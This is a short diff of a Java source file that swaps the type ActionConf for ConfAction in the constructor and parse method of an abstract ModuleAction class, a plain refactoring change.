@@ -15,6 +15,7 @@ import org.json.JSONException;
 import org.json.JSONObject;
 
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfAction;
 import com.android.service.conf.ConfigurationException;
 import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
@@ -34,12 +35,12 @@ abstract class ModuleAction extends SubAction {
 	 * @param jsubaction
 	 *            the conf params
 	 */
-	public ModuleAction( final ActionConf jsubaction) {
+	public ModuleAction( final ConfAction jsubaction) {
 		super( jsubaction);
 	}
 
 	@Override
-	protected boolean parse(ActionConf params) {
+	protected boolean parse(ConfAction params) {
 		
 		try {
 			this.moduleId=params.getString("module");
